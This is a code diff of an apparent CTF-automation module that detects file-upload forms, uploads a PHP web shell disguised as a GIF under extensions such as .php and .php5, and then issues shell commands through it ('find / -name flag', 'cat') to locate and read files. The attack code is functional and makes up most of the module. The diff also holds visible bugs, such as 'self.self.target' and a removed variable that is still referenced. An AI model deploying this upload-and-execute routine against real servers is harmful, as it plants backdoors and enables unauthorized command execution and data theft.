@@ -8,32 +8,19 @@ import subprocess
 import os
 import units.raw
 import re
-import units.web
+import units.web as web
 import requests
 import magic
 import units
 
-delim = '@@DELIMETER@@'
-special = '@@SPECIAL@@'
-
-potential_flag_names = ['flag', 'flag.txt']
-
-
-class Unit(units.web.WebUnit):
+class Unit(web.WebUnit):
 
 	def __init__(self, katana, parent, target):
-
-		# Run the parent constructor, to ensure this is a valid URL
 		super(Unit, self).__init__(katana, parent, target)
-		
-		# Check if we can reach this...
-		try:
-			self.response = requests.get(self.target)
-		except requests.exceptions.ConnectionError:
-			raise units.NotApplicable
 
 		# Check if there is even file upload functionality present
-		self.upload = re.findall(r"enctype=['\"]multipart/form-data['\"]", self.response.text, flags=re.IGNORECASE)
+		self.raw_content = self.target.content.decode('utf-8')
+		self.upload = re.findall(r"enctype=['\"]multipart/form-data['\"]", self.raw_content, flags=re.IGNORECASE)
 
 		if not self.upload:
 			# If not, don't bother with this unit
@@ -45,16 +32,12 @@ class Unit(units.web.WebUnit):
 		# This should "yield 'name', (params,to,pass,to,evaluate)"
 		# evaluate will see this second argument as only one variable and you will need to parse them out
 		
-		action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)
-		method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)
+		action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", self.raw_content, flags=re.IGNORECASE)
+		method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", self.raw_content, flags=re.IGNORECASE)
 		upload = self.upload
 
-		potential_file_variables = [
-			'fileToUpload', 'file', 'upload_file', 'file_to_upload',
-		]
-
-		file_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_file_variables)
-		file = re.findall(file_regex, self.response.text, flags=re.IGNORECASE)
+		file_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(web.potential_file_variables)
+		file = re.findall(file_regex, self.raw_content, flags=re.IGNORECASE)
 
 		if not file:
 			# JOHN: We can't find a filename variable. Maybe it's not in our list yet!
@@ -62,7 +45,7 @@ class Unit(units.web.WebUnit):
 
 		if action and method and upload and file:
 			if action: action = action[0]
-			if action.startswith(self.target): action = action[len(self.target):]
+			if action.startswith(self.target.url_root): action = action[len(self.target.url_root):]
 			if method: method = method[0]
 			if file: file = file[0]
 
@@ -75,15 +58,15 @@ class Unit(units.web.WebUnit):
 			extensions = ['php', 'gif', 'php3', 'php5', 'php7']
 
 			for ext in extensions:
-				r = method(self.target.rstrip('/')+'/' + action, files = {file: ('anything.%s' % ext, 
-					StringIO(f'GIF89a;{delim}<?php system($_GET["c"]) ?>{delim}'), 'image/gif' ) })
+				r = method(self.target.upstream.decode('utf-8').rstrip('/')+ '/' + action, files = {file: ('anything.%s' % ext, 
+					StringIO(f'GIF89a;{web.delim}<?php system($_GET["c"]) ?>{web.delim}'), 'image/gif' ) })
 
 				potential_location_regex = 'href=["\'](.+?.%s)["\']' % ext
 
 				location = re.findall(potential_location_regex, r.text, flags=re.IGNORECASE )
 				if location:
 					for file_path in location:
-						if file_path.startswith(self.target): file_path = file_path[len(self.target):]
+						if file_path.startswith(self.target.url_root): file_path = file_path[len(self.self.target.url_root):]
 						yield (method, action, file, ext, location, file_path)
 
 		else:
@@ -94,15 +77,15 @@ class Unit(units.web.WebUnit):
 		# Split up the self.target (see get_cases)
 		method, action, file, ext, location, file_path = case
 
-		r = requests.get(self.target.rstrip('/')+'/' + file_path,
-					params = { 'c' : f'/bin/echo -n {special}' })
+		r = requests.get(self.target.url_root.rstrip('/')+'/' + file_path,
+					params = { 'c' : f'/bin/echo -n {web.special}' })
 
-		if f'{delim}{special}{delim}' in r.text:
+		if f'{web.delim}{web.special}{web.delim}' in r.text:
 			for flagname in potential_flag_names:
-				r = requests.get(self.target.rstrip('/')+'/' + file_path,
+				r = requests.get(self.target.url_root.rstrip('/')+'/' + file_path,
 				params = { 'c' : f'find / -name {flagname}' })
 
-				flag_locations = re.findall(f'{delim}(.+?){delim}', r.text, flags = re.MULTILINE | re.DOTALL )
+				flag_locations = re.findall(f'{web.delim}(.+?){web.delim}', r.text, flags = re.MULTILINE | re.DOTALL )
 
 				if flag_locations:
 					flag_locations = flag_locations[0]
@@ -110,10 +93,10 @@ class Unit(units.web.WebUnit):
 					for fl in flag_locations.split('\n'):
 						fl = fl.strip()
 					
-						r = requests.get(self.target.rstrip('/')+'/' + file_path,
+						r = requests.get(self.target.url_root.rstrip('/')+'/' + file_path,
 							params = { 'c' : f'cat {fl}' })
 
-						flag = re.findall(f'{delim}(.+?){delim}', r.text, flags = re.MULTILINE | re.DOTALL )
+						flag = re.findall(f'{web.delim}(.+?){web.delim}', r.text, flags = re.MULTILINE | re.DOTALL )
 						if flag:
 							flag = flag[0]
 							katana.add_results(self, flag)
